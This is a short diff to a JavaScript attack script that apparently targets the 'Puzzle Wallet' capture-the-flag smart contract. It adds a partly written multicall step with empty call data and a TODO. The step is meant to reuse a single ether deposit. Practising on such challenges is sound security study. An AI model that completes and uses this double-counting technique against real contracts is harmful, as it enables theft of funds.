@@ -42,6 +42,11 @@ const attackPuzzleWallet = async () => {
     const tx2 = await contractAttack.addToWhitelist(playerAddress);
     // get balance of puzzle contract
     const playerBalance = await provider.getBalance(puzzleWalletAddress);
+    // TODO: fill in function call signature
+    const multicallData = "";
+    const tx3 = await contractAttack.multicall([multicallData, multicallData], {
+        value: ethers.utils.parseEther("0.001"),
+    });
 };
 
 attackPuzzleWallet()
